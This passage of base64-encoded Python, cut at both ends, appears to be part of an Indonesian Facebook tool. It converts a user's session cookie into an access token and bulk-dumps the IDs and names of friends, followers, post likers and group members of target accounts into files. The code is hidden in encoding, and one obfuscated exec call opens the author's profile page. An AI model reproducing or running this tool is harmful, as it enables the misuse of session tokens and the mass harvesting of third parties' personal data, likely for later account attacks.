iAgICByZXR1cm4gcg0KZGVmIGN2cyhjb29raWVzKTogIyBjb252ZXJ0IGNvb2tpZSBkaWN0IHRvIHN0cmluZw0KCXJlc3VsdD1bXQ0KCWZvciBfaV8gaW4gZW51bWVyYXRlKGNvb2tpZXMua2V5cygpKToNCgkJaWYgX2lfWzBdPT1sZW4oY29va2llcy5rZXlzKCkpLTE6cmVzdWx0LmFwcGVuZChfaV9bMV0rIj0iK2Nvb2tpZXNbX2lfWzFdXSkNCgkJZWxzZTpyZXN1bHQuYXBwZW5kKF9pX1sxXSsiPSIrY29va2llc1tfaV9bMV1dKyI7ICIpDQoJcmV0dXJuICIiLmpvaW4ocmVzdWx0KQ0KZGVmIGN2ZChjb29raWVzKTogIyBjb252ZXJ0IGNvb2tpZSBkaWN0IHRvIHN0cmluZw0KCXJlc3VsdD17fQ0KCXRyeToNCgkJZm9yIF9pXyBpbiBjb29raWVzLnNwbGl0KCI7Iik6DQoJCQlyZXN1bHQudXBkYXRlKHtfaV8uc3BsaXQoIj0iKVswXTpfaV8uc3BsaXQoIj0iKVsxXX0pDQoJCXJldHVybiByZXN1bHQNCglleGNlcHQ6DQoJCWZvciBfaV8gaW4gY29va2llcy5zcGxpdCgiOyAiKToNCgkJCXJlc3VsdC51cGRhdGUoe19pXy5zcGxpdCgiPSIpWzBdOl9pXy5zcGxpdCgiPSIpWzFdfSkNCgkJcmV0dXJuIHJlc3VsdA0KIyBDT05WRVJUIENPT0tJRSBLRSBUT0tFTiBCWSBST01JIEFGUklaQUwNCmRlZiBrb252ZXJ0ZXIoKToNCglfY29va2llID0gb3BlbignZGF0YS9jb29raWVzJywgJ3InKS5yZWFkKCkNCglfaGVhZGVyID0gew0KCQknSG9zdCc6J2J1c2luZXNzLmZhY2Vib29rLmNvbScsDQoJCSdjYWNoZS1jb250cm9sJzonbWF4LWFnZT0wJywNCgkJJ3VwZ3JhZGUtaW5zZWN1cmUtcmVxdWVzdHMnOicxJywNCgkJJ3VzZXItYWdlbnQnOidNb3ppbGxhLzUuMCAoTGlu""dXg7IEFuZHJvaWQgNi4wLjE7IFJlZG1pIDRBIEJ1aWxkL01NQjI5TSkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzU5LjAuMzA3MS45MiBNb2JpbGUgU2FmYXJpLzUzNy4zNicsDQoJCSdhY2NlcHQnIDogJ3RleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL3dlYnAsaW1hZ2UvYXBuZywqLyo7cT0wLjgnLA0KCQknY29udGVudC10eXBlJyA6ICd0ZXh0L2h0bWw7IGNoYXJzZXQ9dXRmLTgnLA0KCQknYWNjZXB0LWVuY29kaW5nJzonZ3ppcCwgZGVmbGF0ZScsDQoJCSdhY2NlcHQtbGFuZ3VhZ2UnOidpZC1JRCxpZDtxPTAuOSxlbi1VUztxPTAuOCxlbjtxPTAuNycsDQoJCSdjb29raWUnOiBfY29va2llDQoJfQ0KCXRyeToNCgkJbGluZyA9IHJlcXVlc3RzLmdldCgiaHR0cHM6Ly9idXNpbmVzcy5mYWNlYm9vay5jb20vYnVzaW5lc3NfbG9jYXRpb25zIiwgaGVhZGVycz1faGVhZGVyKQ0KCQljYXJpID0gcmUuc2VhcmNoKCcoRUFBR1x3KyknLCBsaW5nLnRleHQpDQoJCXJvbXogPSBjYXJpLmdyb3VwKDEpDQoJCWlmICdFQUFHJyBpbiByb216Og0KCQkJcHJpbnQgKCdcbiVzJXMgTG9naW4gc3VjY2VzLCBtb2hvbiB0dW5nZ3UgJyUoSCx0aWwpKQ0KCQkJb3BlbignZGF0YS90b2tlbi50eHQnLCAndycpLndyaXRlKHJvbXopO2xvZ2luX3h4KCkNCgkJCWV4ZWMoYmFzZTY0LmI2NGRlY29kZSgnYjNNdWMzbHpkR1Z0S0NkNFpHY3RiM0JsYmlCb2RIUndjem92TDNkM2R5NW1ZV05sWW05dmF5NWpiMjB2Y205dGFTNWhabkpwZW1Gc0xqRXdNaWNwTzIxbGJuVW9LUT09JykpDQoJCQlleGl0KCkNCglleGNlcHQgQXR0cmlidXRlRXJyb3I6DQoJCXByaW50KCIlc+KAoiB0ZXJqYWRpIGtlc2FsYWhhbiBzYWF0IGNvbnZlcnQsIHBlcmlrc2EgY29va2llIGFuZGEgIiUoTSkpO2V4aXQoKQ0KIyBEVU1QIFBVQkxJSw0KZGVmIHB1Ymxpayhyb216LGhlYWRlcnM9aGVhZGVyKToNCiAgICB0cnk6DQogICAgICAgIG9zLm1rZGlyKCdkdW1wJykNCiAgICBleGNlcHQ6cGFzcw0KICAgIHRyeToNCiAgICAJcHJpbnQgKCJcbiVzJXMgJXNLZXRpayAnJXNtZSVzJyBqaWthIGluZ2luIGR1bXAgZGFmdGFyIHRlbWFuIHNlbmRpcmkgIiUoVSx0aWwsTyxILE8pKQ0KICAgICAgICBpZHQgPSByYXdfaW5wdXQoJyVzJXMgJXNUYXJnZXQgaWQlcyA+ICVzJyUoVSx0aWwsTyxNLEspKQ0KICAgICAgICAjc2ltcGFuID0gcmF3X2lucHV0KCclcyVzJXMgTmFtYSBmaWxlJXMgPiAlcyclKFUsdGlsLE8sTSxLKSkNCiAgICAgICAgZ2FzID0gcmVxdWVzdHMuZ2V0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8lcz9hY2Nlc3NfdG9rZW49JXMnJShpZHQscm9teikpDQogICAgICAgIG5tID0ganNvbi5sb2FkcyhnYXMudGV4dCkNCiAgICAgICAgZmlsZSA9ICgnZHVtcC8nK25tWydmaXJzdF9uYW1lJ10rJy5qc29uJykucmVwbGFjZSgnICcsICdfJykNCiAgICAgICAgYmZmID0gb3BlbihmaWxl""LCAndycpDQogICAgICAgIHIgPSByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLyVzP2ZpZWxkcz1mcmllbmRzLmxpbWl0KDUwMDEpJmFjY2Vzc190b2tlbj0lcyclKGlkdCxyb216KSkNCiAgICAgICAgeiA9IGpzb24ubG9hZHMoci50ZXh0KQ0KICAgICAgICBmb3IgX3hfIGluIHpbJ2ZyaWVuZHMnXVsnZGF0YSddOg0KICAgICAgICAgICAgaWQuYXBwZW5kKF94X1snaWQnXSArICc8PT4nICsgX3hfWyduYW1lJ10pDQogICAgICAgICAgICBiZmYud3JpdGUoX3hfWydpZCddICsgJzw9PicgKyBfeF9bJ25hbWUnXSArICdcbicpDQogICAgICAgICAgICBwcmludCAnXHIlcyVzJXMgbWVuZ3VtcHVsa2FuIGlkJXMgPiVzICVzICcgJSAoVSx0aWwsTyxNLEgsc3RyKGxlbihpZCkpKSwNCiAgICAgICAgICAgIHN5cy5zdGRvdXQuZmx1c2goKTtqZWRhKDAuMDA1MCkNCg0KICAgICAgICBiZmYuY2xvc2UoKQ0KICAgICAgICBwcmludCAoJ1xuXG4lcyVzIFN1Y2NlcyBkdW1wIGlkIGRhcmkgJXMnJShILHRpbCxubVsnbmFtZSddKSkNCiAgICAgICAgcHJpbnQgKCclcyVzJXMgRmlsZSBkdW1wIHRlcnNpbXBhbiAlcz4lcyAlcyAnJShVLHRpbCxPLE0sSCxmaWxlKSkNCiAgICAgICAgcmF3X2lucHV0KCdcbiVzJXMlcyBbJXMgRW50ZXIlcyBdICclKFUsdGlsLE8sVSxPKSkNCiAgICAgICAgbWVudSgpDQogICAgZXhjZXB0IEtleUVycm9yOg0KICAgICAgICBleGl0KCdcbiVzJXMgZ2FnYWwgZHVtcCBpZCclKE0sdGlsKSkNCiAgICBleGNlcHQgSU9FcnJvcjoNCiAgICAJZXhpdCgnXG4lcyVzIGdhZ2FsIG1lbWJ1YXQgZmlsZSclKE0sdGlsKSkNCiAgICBleGNlcHQgT1NFcnJvcjoNCiAgICAJZXhpdCgnXG4lcyVzIGdhZ2FsIG1lbnlpbXBhbiBmaWxlJyUoTSx0aWwpKQ0KICAgIGV4Y2VwdCAoS2V5Ym9hcmRJbnRlcnJ1cHQsRU9GRXJyb3IpOg0KICAgIAlleGl0KCdcbiVzJXMgc3RvcCclKE0sdGlsKSkNCiAgICBleGNlcHQgcmVxdWVzdHMuZXhjZXB0aW9ucy5Db25uZWN0aW9uRXJyb3I6DQogICAgCWV4aXQoJ1xuJXMlcyB0aWRhayBhZGEga29uZWtzaSclKE0sdGlsKSkNCiMgRFVNUCBNQVNTQUwgDQpkZWYgbWFzc2FsKHJvbXosaGVhZGVycz1oZWFkZXIpOg0KCXRyeToNCgkJb3MubWtkaXIoJ2R1bXAnKQ0KCWV4Y2VwdDpwYXNzDQoJdHJ5Og0KCQlqdW0gPSBpbnQocmF3X2lucHV0KCdcbiVzJXMlcyBKdW1sYWggaWQlcyA+ICVzJyUoVSx0aWwsTyxNLEspKSkNCglleGNlcHQ6anVtPTENCglzaW1wYW4gPSByYXdfaW5wdXQoJyVzJXMlcyBOYW1hIGZpbGUlcyA+ICVzJyUoVSx0aWwsTyxNLEspKQ0KCXByaW50ICgiXG4lcyVzICVzS2V0aWsgJyVzbWUlcycgamlrYSBpbmdpbiBkdW1wIGRhZnRhciB0ZW1hbiBzZW5kaXJpICIlKFUsdGlsLE8sSCxPKSkNCglmaWxlID0gKCdkdW1wLycrc2ltcGFuKycuanNvbicpLnJlcGxhY2UoJyAnLCAnXycpDQoJYmZmID0gb3BlbihmaWxlLCAndycpDQoJZm9yIHQgaW4gcmFuZ2UoanVtKToNCgkJ""dCArPTENCgkJaWR0ID0gcmF3X2lucHV0KCclcyVzICVzVGFyZ2V0IGlkICVzJXMgPiAlcyclKFUsdGlsLE8sdCxNLEspKQ0KCQl0cnk6DQoJCQlmb3IgX3hfIGluIHJlcXVlc3RzLmdldCgiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vJXMvZnJpZW5kcz9hY2Nlc3NfdG9rZW49JXMiJShpZHQsIHJvbXopKS5qc29uKClbImRhdGEiXToNCgkJCQlpZC5hcHBlbmQoX3hfWydpZCddICsgJzw9PicgKyBfeF9bJ25hbWUnXSkNCgkJCQliZmYud3JpdGUoX3hfWydpZCddICsgJzw9PicgKyBfeF9bJ25hbWUnXSArICdcbicpDQojICAgICAgICAgICAgICBwcmludCAoJ1xyJXMlcyVzIG1lbmd1bXB1bGthbiBpZCVzID4gJXMlcyclKFUsdGlsLE8sTSxILHN0cihsZW4oaWQpKSkpDQojICAgICAgICAgICAgICAsc3lzLnN0ZG91dC5mbHVzaCgpO2plZGEoMC4wMDUwKQ0KCQlleGNlcHQgS2V5RXJyb3I6DQoJCQlleGl0KCdcbiVzJXMgaWQgdGlkYWsgcHVibGljJyUoTSx0aWwpKQ0KCXRyeToNCgkJYmZmLmNsb3NlKCkNCgkJcHJpbnQgKCclcyVzJXMgVG90YWwgaWQlcyA+ICVzJXMnJShVLHRpbCxPLE0sSCxsZW4oaWQpKSkNCgkJcHJpbnQgKCdcbiVzJXMgU3VjY2VzIGR1bXAgaWQgbWFzc2FsICclKEgsdGlsKSkNCgkJcHJpbnQgKCclcyVzJXMgRmlsZSBkdW1wIHRlcnNpbXBhbiAlcz4lcyAlcyAnJShVLHRpbCxPLE0sSCxmaWxlKSkNCgkJcmF3X2lucHV0KCdcbiVzJXMlcyBbJXMgRW50ZXIlcyBdICclKFUsdGlsLE8sVSxPKSkNCgkJbWVudSgpDQoJZXhjZXB0IElPRXJyb3I6DQoJCWV4aXQoJ1xuJXMlcyBnYWdhbCBtZW1idWF0IGZpbGUnJShNLHRpbCkpDQoJZXhjZXB0IE9TRXJyb3I6DQoJCWV4aXQoJ1xuJXMlcyBnYWdhbCBtZW55aW1wYW4gZmlsZSclKE0sdGlsKSkNCglleGNlcHQgKEtleWJvYXJkSW50ZXJydXB0LEVPRkVycm9yKToNCgkJZXhpdCgnXG4lcyVzIHN0b3AnJShNLHRpbCkpDQoJZXhjZXB0IHJlcXVlc3RzLmV4Y2VwdGlvbnMuQ29ubmVjdGlvbkVycm9yOg0KCQlleGl0KCdcbiVzJXMgdGlkYWsgYWRhIGtvbmVrc2knJShNLHRpbCkpDQojIERVTVAgRk9MTE9XRVJTDQpkZWYgZm9sbG93ZXJzKHJvbXosaGVhZGVycz1oZWFkZXIpOg0KICAgIHRyeToNCiAgICAgICAgb3MubWtkaXIoJ2R1bXAnKQ0KICAgIGV4Y2VwdDpwYXNzDQogICAgdHJ5Og0KICAgIAlwcmludCAoIlxuJXMlcyAlc0tldGlrICclc21lJXMnIGppa2EgaW5naW4gZHVtcCBmb2xsb3dlcnMgc2VuZGlyaSAiJShVLHRpbCxPLEgsTykpDQogICAgICAgIGlkdCA9IHJhd19pbnB1dCgnJXMlcyAlc1RhcmdldCBpZCVzICA+ICVzJyUoVSx0aWwsTyxNLEspKQ0KICAgICAgICBiYXRhcyA9IHJhd19pbnB1dCgnJXMlcyAlc01heGltYWwgaWQlcyA+ICVzJyUoVSx0aWwsTyxNLEspKQ0KICAgICAgICAjc2ltcGFuID0gcmF3X2lucHV0KCclcyVzJXMgTmFtYSBmaWxlJXMgID4gJXMnJShVLHRpbCxPLE0sSykpDQogICAgICAgIGdhcyA9IHJlcXVlc3RzLmdldCgnaHR0cHM6Ly9n""cmFwaC5mYWNlYm9vay5jb20vJXM/YWNjZXNzX3Rva2VuPSVzJyUoaWR0LHJvbXopKQ0KICAgICAgICBubSA9IGpzb24ubG9hZHMoZ2FzLnRleHQpDQogICAgICAgIGZpbGUgPSAoJ2R1bXAvJytubVsnZmlyc3RfbmFtZSddKycuanNvbicpLnJlcGxhY2UoJyAnLCAnXycpDQogICAgICAgIGJmZiA9IG9wZW4oZmlsZSwgJ3cnKQ0KICAgICAgICByID0gcmVxdWVzdHMuZ2V0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8lcy9zdWJzY3JpYmVycz9saW1pdD0lcyZhY2Nlc3NfdG9rZW49JXMnJShpZHQsYmF0YXMscm9teikpDQogICAgICAgIHogPSBqc29uLmxvYWRzKHIudGV4dCkNCiAgICAgICAgZm9yIF94XyBpbiB6WydkYXRhJ106DQogICAgICAgICAgICBpZC5hcHBlbmQoX3hfWydpZCddICsgJzw9PicgKyBfeF9bJ25hbWUnXSkNCiAgICAgICAgICAgIGJmZi53cml0ZShfeF9bJ2lkJ10gKyAnPD0+JyArIF94X1snbmFtZSddICsgJ1xuJykNCiAgICAgICAgICAgIHByaW50ICgnXHIlcyVzJXMgbWVuZ3VtcHVsa2FuIGlkJXMgPiVzICVzICcgJSAoVSx0aWwsTyxNLEgsc3RyKGxlbihpZCkpKSksDQogICAgICAgICAgICBzeXMuc3Rkb3V0LmZsdXNoKCk7amVkYSgwLjAwNTApDQoNCiAgICAgICAgYmZmLmNsb3NlKCkNCiAgICAgICAgcHJpbnQgKCdcblxuJXMlcyBTdWNjZXMgZHVtcCBmb2xsb3dlcnMgZGFyaSAlcyAnJShILHRpbCxubVsibmFtZSJdKSkNCiAgICAgICAgcHJpbnQgKCclcyVzJXMgRmlsZSBkdW1wIHRlcnNpbXBhbiAlcz4lcyAlcyAnJShVLHRpbCxPLE0sSCxmaWxlKSkNCiAgICAgICAgcmF3X2lucHV0KCdcbiVzJXMlcyBbJXMgRW50ZXIlcyBdICclKFUsdGlsLE8sVSxPKSkNCiAgICAgICAgbWVudSgpDQogICAgZXhjZXB0IEtleUVycm9yOg0KICAgICAgICBleGl0KCdcbiVzJXMgZ2FnYWwgZHVtcCBpZCclKE0sdGlsKSkNCiAgICBleGNlcHQgSU9FcnJvcjoNCiAgICAJZXhpdCgnXG4lcyVzIGdhZ2FsIG1lbWJ1YXQgZmlsZSclKE0sdGlsKSkNCiAgICBleGNlcHQgT1NFcnJvcjoNCiAgICAJZXhpdCgnXG4lcyVzIGdhZ2FsIG1lbnlpbXBhbiBmaWxlJyUoTSx0aWwpKQ0KICAgIGV4Y2VwdCAoS2V5Ym9hcmRJbnRlcnJ1cHQsRU9GRXJyb3IpOg0KICAgIAlleGl0KCdcbiVzJXMgc3RvcCclKE0sdGlsKSkNCiAgICBleGNlcHQgcmVxdWVzdHMuZXhjZXB0aW9ucy5Db25uZWN0aW9uRXJyb3I6DQogICAgCWV4aXQoJ1xuJXMlcyB0aWRhayBhZGEga29uZWtzaSclKE0sdGlsKSkNCiMgRFVNUCBQT1NUSU5HQU4gDQpkZWYgcG9zdGluZ2FuKHJvbXosaGVhZGVycz1oZWFkZXIpOg0KICAgIHRyeToNCiAgICAgICAgb3MubWtkaXIoJ2R1bXAnKQ0KICAgIGV4Y2VwdDpwYXNzDQogICAgdHJ5Og0KICAgIAlwcmludCAoIlxuJXMlcyAlc1Blcmx1IGRpIGluZ2F0IHBvc3RpbmdhbiBoYXJ1cyBiZXJzaWZhdCBwdWJsaWsgIiUoVSx0aWwsTykpDQogICAgICAgIGlkdCA9IHJhd19pbnB1dCgnJXMlcyAlc0lkIHBvc3QlcyAgID4gJXMnJShV""LHRpbCxPLE0sSykpDQogICAgICAgIHNpbXBhbiA9IHJhd19pbnB1dCgnJXMlcyVzIE5hbWEgZmlsZSVzID4gJXMnJShVLHRpbCxPLE0sSykpDQogICAgICAgIHIgPSByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLyVzL2xpa2VzP2xpbWl0PTk5OTk5OSZhY2Nlc3NfdG9rZW49JXMnJShpZHQscm9teikpDQogICAgICAgIGlkID0gW10NCiAgICAgICAgeiA9IGpzb24ubG9hZHMoci50ZXh0KQ0KICAgICAgICBmaWxlID0gKCdkdW1wLycgKyBzaW1wYW4gKyAnLmpzb24nKS5yZXBsYWNlKCcgJywgJ18nKQ0KICAgICAgICBiZmYgPSBvcGVuKGZpbGUsICd3JykNCiAgICAgICAgZm9yIF94XyBpbiB6WydkYXRhJ106DQogICAgICAgICAgICBpZC5hcHBlbmQoX3hfWydpZCddICsgJzw9PicgKyBfeF9bJ25hbWUnXSkNCiAgICAgICAgICAgIGJmZi53cml0ZShfeF9bJ2lkJ10gKyAnPD0+JyArIF94X1snbmFtZSddICsgJ1xuJykNCiAgICAgICAgICAgIHByaW50ICdcciVzJXMlcyBtZW5ndW1wdWxrYW4gaWQlcyA+JXMgJXMgJyAlIChVLHRpbCxPLE0sSCxzdHIobGVuKGlkKSkpLA0KICAgICAgICAgICAgc3lzLnN0ZG91dC5mbHVzaCgpO2plZGEoMC4wMDUwKQ0KDQogICAgICAgIGJmZi5jbG9zZSgpDQogICAgICAgIHByaW50ICgnXG5cbiVzJXMgU3VjY2VzIGR1bXAgaWQgcG9zdGluZ2FuICclKEgsdGlsKSkNCiAgICAgICAgcHJpbnQgKCclcyVzJXMgRmlsZSBkdW1wIHRlcnNpbXBhbiAlcz4lcyAlcyAnJShVLHRpbCxPLE0sSCxmaWxlKSkNCiAgICAgICAgcmF3X2lucHV0KCdcbiVzJXMlcyBbJXMgRW50ZXIlcyBdICclKFUsdGlsLE8sVSxPKSkNCiAgICAgICAgbWVudSgpDQogICAgZXhjZXB0IEtleUVycm9yOg0KICAgICAgICBleGl0KCdcbiVzJXMgZ2FnYWwgZHVtcCBpZCclKE0sdGlsKSkNCiAgICBleGNlcHQgSU9FcnJvcjoNCiAgICAJZXhpdCgnXG4lcyVzIGdhZ2FsIG1lbWJ1YXQgZmlsZSclKE0sdGlsKSkNCiAgICBleGNlcHQgT1NFcnJvcjoNCiAgICAJZXhpdCgnXG4lcyVzIGdhZ2FsIG1lbnlpbXBhbiBmaWxlJyUoTSx0aWwpKQ0KICAgIGV4Y2VwdCAoS2V5Ym9hcmRJbnRlcnJ1cHQsRU9GRXJyb3IpOg0KICAgIAlleGl0KCdcbiVzJXMgc3RvcCclKE0sdGlsKSkNCiAgICBleGNlcHQgcmVxdWVzdHMuZXhjZXB0aW9ucy5Db25uZWN0aW9uRXJyb3I6DQogICAgCWV4aXQoJ1xuJXMlcyB0aWRhayBhZGEga29uZWtzaSclKE0sdGlsKSkNCiMgRFVNUCBHUk9VUA0KY2xhc3MgZ3JvdXA6DQoJDQoJZGVmIF9faW5pdF9fKHNlbGYsIGNvb2tpZXMpOg0KCQlzZWxmLmdsaXN0PVtdDQoJCXNlbGYuY29va2llcz1jb29raWVzDQoJCXNlbGYubWFudWFsKCk7ZXhpdCgpDQoJZGVmIG1hbnVhbChzZWxmKToNCgkJcHJpbnQoIlxuJXMlcyVzIFBlcmx1IGRpIGluZ2F0IGdyb3VwIGhhcnVzIGJlcnNpZmF0IHB1YmxpayBhdGF1IHdhamliIGpvaW4gZ3JvdXAiJShVLHRpbCxPKSkNCgkJaWQ9cmF3X2lucHV0KCIlcyVzJXMgSWQgZ3Jv""dXBzJXMgPiAlcyIlKFUsdGlsLE8sTSxLKSkNCgkJaWYgaWQgaW4oIiIpOg0KCQkJc2VsZi5tYW51YWwoKQ0KCQllbHNlOg0KCQkJX3JfPWJzNC5CZWF1dGlmdWxTb3VwKHJlcXVlc3RzLmdldCgiaHR0cHM6Ly9tYmFzaWMuZmFjZWJvb2suY29tL2dyb3Vwcy8iK2lkLGhlYWRlcnM9aGRjb2soKSxjb29raWVzPXNlbGYuY29va2llcykudGV4dCwiaHRtbC5wYXJzZXIiKQ0KCQkJaWYgImtvbnRlbiB0aWRhayIgaW4gX3JfLmZpbmQoInRpdGxlIikudGV4dC5sb3dlcigpOg0KCQkJCWV4aXQoIiVzJXMgaW5wdXQgaWQgZ3J1cCB5ZyB2YWxpZCBnb2Jsb2ssIGlkIGVycm9yLCBhdGF1IGx1IGJlbG9tIGpvb2luIGRpIGdydXAiJShNLHRpbCkpDQoJCQllbHNlOg0KCQkJCXNlbGYubGlzdGVkPXsiaWQiOmlkLCJuYW1lIjpfcl8uZmluZCgidGl0bGUiKS50ZXh0fQ0KCQkJCXNlbGYuZnVja195b3UoKQ0KCQkJCXByaW50KCIlcyVzJXMgTmFtYSBncnVwJXMgPiAlcyVzLi4iJShVLHRpbCxPLE0sSCxzZWxmLmxpc3RlZC5nZXQoIm5hbWUiKVswOjIwXSkpDQoJCQkJc2VsZi5kdW1wcygiaHR0cHM6Ly9tYmFzaWMuZmFjZWJvb2suY29tL2dyb3Vwcy8iK2lkKQ0KCWRlZiBmdWNrX3lvdShzZWxmKToNCgkJc2VsZi5mbD1yYXdfaW5wdXQoJyVzJXMlcyBOYW1hIGZpbGUgJXM+ICVzJyUoVSx0aWwsTyxNLEspKS5yZXBsYWNlKCIgIiwiXyIpDQoJCWlmIHNlbGYuZmw9PScnOnNlbGYuZnVja195b3UoKQ0KCQlvcGVuKHNlbGYuZmwsInciKS5jbG9zZSgpDQoJZGVmIGR1bXBzKHNlbGYsIHVybCk6DQoJCV9yXz1iczQuQmVhdXRpZnVsU291cChyZXF1ZXN0cy5nZXQodXJsLGNvb2tpZXM9c2VsZi5jb29raWVzLGhlYWRlcnM9aGRjb2soKSkudGV4dCwiaHRtbC5wYXJzZXIiKQ0KCQlwcmludCgiXHIlcyVzJXMgbWVuZ3VtcHVsa2FuIGlkICVzPiAlcyVzIFx4MWJbMTs5N20tIG1vaG9uIHR1bmdndVxyIiUoVSx0aWwsTyxNLEgsc3RyKGxlbihvcGVuKHNlbGYuZmwpLnJlYWQoKS5zcGxpdGxpbmVzKCkpKSkpDQoJCXN5cy5zdGRvdXQuZmx1c2goKTtqZWRhKDAuMDA1MCkNCgkJZm9yIF9pXyBpbiBfcl8uZmluZF9hbGwoImgzIik6DQoJCQl0cnk6DQoJCQkJaWYgbGVuKGJzNC5yZS5maW5kYWxsKCJcLyIsX2lfLmZpbmQoImEiLGhyZWY9VHJ1ZSkuZ2V0KCJocmVmIikpKT09MToNCgkJCQkJb2dlaD1faV8uZmluZCgiYSIsaHJlZj1UcnVlKQ0KCQkJCQlpZiAicHJvZmlsZS5waHAiIGluIG9nZWguZ2V0KCJocmVmIik6DQoJCQkJCQlfYV89IiIuam9pbihiczQucmUuZmluZGFsbCgicHJvZmlsZVwucGhwXD9pZD0oLio/KSYiLG9nZWguZ2V0KCJocmVmIikpKQ0KCQkJCQkJaWYgbGVuKF9hXyk9PTA6Y29udGludWUNCgkJCQkJCWVsaWYgX2FfIGluIG9wZW4oc2VsZi5mbCkucmVhZCgpOg0KCQkJCQkJCWNvbnRpbnVlDQoJCQkJCQllbHNlOg0KCQkJCQkJCW9wZW4oc2VsZi5mbCwiYSsiKS53cml0ZSgiJXM8PT4lc1xuIiUoX2FfLG9nZWgudGV4dCkpDQoJCQkJCQkJY29udGlu""dWUNCgkJCQkJZWxzZToNCgkJCQkJCV9hXz0iIi5qb2luKGJzNC5yZS5maW5kYWxsKCIvKC4qPylcPyIsb2dlaC5nZXQoImhyZWYiKSkpDQoJCQkJCQlpZiBsZW4oX2FfKT09MDpjb250aW51ZQ0KCQkJCQkJZWxpZiBfYV8gaW4gb3BlbihzZWxmLmZsKS5yZWFkKCk6DQoJCQkJCQkJY29udGludWUNCgkJCQkJCWVsc2U6DQoJCQkJCQkJb3BlbihzZWxmLmZsLCJhKyIpLndyaXRlKCIlczw9PiVzXG4iJShfYV8sb2dlaC50ZXh0KSkNCgkJCWV4Y2VwdDpjb250aW51ZQ0KCQlmb3IgX2lfIGluIF9yXy5maW5kX2FsbCgiYSIsaHJlZj1UcnVlKToNCgkJCWlmICJMaWhhdCBQb3N0aW5nYW4gTGFpbm55YSIgaW4gX2lfLnRleHQ6DQoJCQkJd2hpbGUgVHJ1ZToNCgkJCQkJdHJ5Og0KCQkJCQkJc2VsZi5kdW1wcygiaHR0cHM6Ly9tYmFzaWMuZmFjZWJvb2suY29tLyIrX2lfLmdldCgiaHJlZiIpKQ0KCQkJCQkJYnJlYWsNCgkJCQkJZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOg0KCQkJCQkJcHJpbnQoIlxyXHgxYlsxOzkxbeKAoiVzLCByZXRyeWluZy4uLiIlZSk7Y29udGludWUNCgkJcHJpbnQgKCdcblxuJXMlcyBTdWNjZXMgZHVtcCBpZCBtZW1iZXIgZ3JvdXAgJyUoSCx0aWwpKTtwcmludCAoJyVzJXMlcyBGaWxlIGR1bXAgdGVyc2ltcGFuICVzPiVzICVzICclKFUsdGlsLE8sTSxILHNlbGYuZmwpKTtyYXdfaW5wdXQoJ1xuJXMlcyVzIFslcyBFbnRlciVzIF0gJyUoVSx0aWwsTyxVLE8pKTttZW51KCkNCmRlZiBjZWsoYXJnKToNCglpZiBvcy5wYXRoLmV4aXN0cygiZGF0YS9jb29raWVzIik6DQoJCWlmIG9zLnBhdGguZ2V0c2l6ZSgiZGF0YS9jb29raWVzIikgIT0wOg0KCQkJcmV0dXJuIFRydWUNCgkJZWxzZTpyZXR1cm4gRmFsc2UNCgllbHNlOnJldHVybiBGYWxzZQ0KIyBEVU1QIFBFTkNBUklBTiBOQU1BDQpkZWYgZHVtcGZsKCk6DQogICAgY3ZkcyA9IE5vbmUNCiAgICBjb29raWUgPSBOb25lDQogICAgbmV3ID0gTm9uZQ0KICAgIGlmIGNlaygxKSA9PSBGYWxzZToNCiAgICAgICAgdHJ5Og0KICAgICAgICAgICAgY29va2llID0gcmF3X2lucHV0KCJcbiVzJXMlcyBTdXBheWEgYmVrZXJqYSBtYXN1a2FuIGNvb2tpZSBmYWNlYm9vayBhbmRhXG4lcyMgJXNDb29raWUlcyA+ICVzIiUoVSx0aWwsTyxQLE8sTSxLKSkNCiAgICAgICAgICAgIGN2ZHMgPSBjdmQoY29va2llKQ0KICAgICAgICAgICAgbmV3ID0gVHJ1ZQ0KICAgICAgICBleGNlcHQ6DQogICAgICAgICAgICBwcmludCgiXHgxYlsxOzkxbeKAoiBpbnZhbGlkIGNvb2tpZSIpO2R1bXBmbCgpDQogICAgZWxzZToNCiAgICAgICAgY3ZkcyA9IGN2ZChvcGVuKCdkYXRhL2Nvb2tpZXMnKS5yZWFkKCkuc3RyaXAoKSkNCiAgICByID0gcmVxdWVzdHMuZ2V0KCdodHRwczovL21iYXNpYy5mYWNlYm9vay5jb20vcHJvZmlsZS5waHAnLCBjb29raWVzPWN2ZHMsIGhlYWRlcnM9aGRjb2soKSkudGV4dA0KICAgIGlmIGxlbihiczQucmUuZmluZGFsbCgnbG9nb3V0JywgcikpICE9IDA6DQogICAgICAgIGlm""IGt1ZWgoY3ZkcykgIT0gVHJ1ZToNCiAgICAgICAgICAgIGV4aXQoIiVzJXMgZ2FnYWwgc2FhdCBtZW5kZXRla3NpIGJhaGFzYS4iJShNLHRpbCkpDQogICAgICAgICNwcmludCgiXG4lcyVzJXMgTG9naW4gc2ViYWdhaSVzIFsgJXMlcy4uXSIlKFUsdGlsLE8sTSxILGJzNC5CZWF1dGlmdWxTb3VwKHIsImh0bWwucGFyc2VyIikuZmluZCgidGl0bGUiKS50ZXh0WzA6MTBdKSkNCiAgICAgICAgaWYgbmV3ID09IFRydWU6DQogICAgICAgICAgICBvcGVuKCdkYXRhL2Nvb2tpZXMnLCAndycpLndyaXRlKGNvb2tpZSkNCiAgICAgICAgc2ltPXJhd19pbnB1dCgiXG4lcyVzJXMgTmFtYSBmaWxlICVzPiVzICIlKFUsdGlsLE8sTSxLKSkucmVwbGFjZSgiICIsIl8iKQ0KICAgICAgICBwcmludCAoIiVzJXMlcyBFeGFtcGxlIG5hbWEgb3JhbmcgJXNbICVzUm9taSxnYW50ZW5nICVzXSAiJShVLHRpbCxPLFAsSCxQKSkNCiAgICAgICAgbm1fb3Jhbmc9cmF3X2lucHV0KCIlcyVzJXMgU2V0dCBuYW1hICVzPiAlcyIlKFUsdGlsLE8sTSxLKSkNCiAgICAgICAgaWYgbm1fb3JhbmcgaW4oInJvbWkiLCJSb21pIiwiUk9NSSIsIlJvbWkgQWZyaXphbCIsIlJvbWkg